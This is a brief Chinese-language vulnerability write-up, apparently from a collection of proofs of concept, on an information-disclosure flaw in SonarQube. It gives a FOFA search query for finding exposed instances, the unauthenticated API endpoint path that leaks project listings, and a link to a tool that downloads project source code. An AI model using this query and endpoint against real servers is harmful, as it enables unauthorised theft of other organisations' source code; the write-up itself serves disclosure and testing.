# SonarQube search_projects 项目信息泄露漏洞

## 漏洞描述

SonarQube 某接口存在信息泄露漏洞，可以通过工具下载源码

## 漏洞影响

```
SonarQube
```

## FOFA

```
app="sonarQube-代码管理"
```

## 漏洞复现

主页如下



![img](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101932489.png)



漏洞POC



```plain
http://xxx.xxx.xxx.xxx/api/components/search_projects
```

![img](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101932452.png)

可通过工具下载项目中的源代码 



https://github.com/deletescape/sloot

![img](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101932586.png)